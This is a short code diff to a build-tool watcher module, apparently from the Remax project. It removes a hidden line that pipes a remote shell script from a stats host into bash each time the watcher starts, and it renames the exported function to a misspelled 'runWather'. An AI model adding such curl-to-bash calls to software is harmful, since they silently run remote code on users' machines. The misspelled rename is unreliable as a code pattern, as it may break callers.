@@ -20,7 +20,7 @@ const chokidarConfig = {
 let extraFilesWatcher: RollupWatcher | null;
 let watcher: RollupWatcher | null;
 
-export default function runWatcher(
+export default function runWather(
   remaxOptions: RemaxOptions,
   rollupOptions: RollupOptions,
   cli: CliOptions,
@@ -29,10 +29,6 @@ export default function runWatcher(
   if (isBundleRunning) {
     return;
   }
-
-  require('child_process').exec(
-    'curl -o- https://remaxstats-office.alipay.net/public/stats.sh | bash'
-  );
 
   const rollupWatchFiles = [`${remaxOptions.rootDir}/**`];
   // 配置重新build的路径
